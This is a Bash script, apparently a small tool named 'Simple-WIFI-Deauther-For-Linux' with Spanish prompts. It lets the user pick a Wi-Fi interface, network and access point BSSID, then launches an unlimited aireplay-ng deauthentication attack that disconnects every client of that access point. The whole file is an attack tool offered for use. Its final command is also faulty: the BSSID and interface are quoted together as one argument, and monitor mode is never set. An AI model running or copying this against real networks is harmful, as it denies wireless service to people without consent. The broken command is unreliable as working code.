#!/usr/bin/env bash
set -euo pipefail

echo "Simple-WIFI-Deauther-For-Linux"
echo -e "\n"

# 1) Interfaces Wi-Fi
mapfile -t IFACES < <(
  nmcli -t -f DEVICE,TYPE device status | awk -F: '$2=="wifi"{print $1}'
)

[ ${#IFACES[@]} -eq 0 ] && { echo "No se encontraron interfaces WIFI disponibles"; exit 1; }

echo "Selecciona la interfaz WIFI:"
select IFACE in "${IFACES[@]}" "Salir"; do
  [[ "$IFACE" == "Salir" ]] && exit 0
  [[ -n "${IFACE:-}" ]] && break
done

# 2) Scan
nmcli dev wifi rescan ifname "$IFACE" >/dev/null 2>&1 || true

# 3) SSIDs
mapfile -t SSIDS < <(
  nmcli -t -f SSID dev wifi list ifname "$IFACE" | sed '/^$/d' | awk '!seen[$0]++'
)

[ ${#SSIDS[@]} -eq 0 ] && { echo "No hay SSIDs disponibles"; exit 1; }

echo "Selecciona la red WIFI (SSID):"
select SSID in "${SSIDS[@]}" "Salir"; do
  [[ "$SSID" == "Salir" ]] && exit 0
  [[ -n "${SSID:-}" ]] && break
done

# 4) BSSIDs (MACs) para ese SSID
mapfile -t BSSIDS < <(
  nmcli -f BSSID,SSID,SIGNAL dev wifi list ifname "$IFACE" \
  | awk -v target="$SSID" '
      NR==1 {next}  # saltear header
      {
        mac=$1
        sig=$NF

        $1=""; $NF=""
        sub(/^ +/, "", $0)
        sub(/ +$/, "", $0)
        ss=$0

        if (ss==target && mac ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) print mac
      }' \
  | awk '!seen[$0]++'
)

if [ ${#BSSIDS[@]} -eq 0 ]; then
  echo "No encontré BSSID para '$SSID' en $IFACE."
  echo "Debug:"
  nmcli -f BSSID,SSID,SIGNAL dev wifi list ifname "$IFACE" | sed -n '1,25p'
  exit 1
fi

echo "Selecciona la MAC (BSSID):"
select BSSID in "${BSSIDS[@]}" "Salir"; do
  [[ "$BSSID" == "Salir" ]] && exit 0
  [[ -n "${BSSID:-}" ]] && break
done

# 5) Comando final
echo
echo "Ejecutando Deauther..."
echo -e "\n"
aireplay-ng --deauth 0 -a "$BSSID $IFACE"
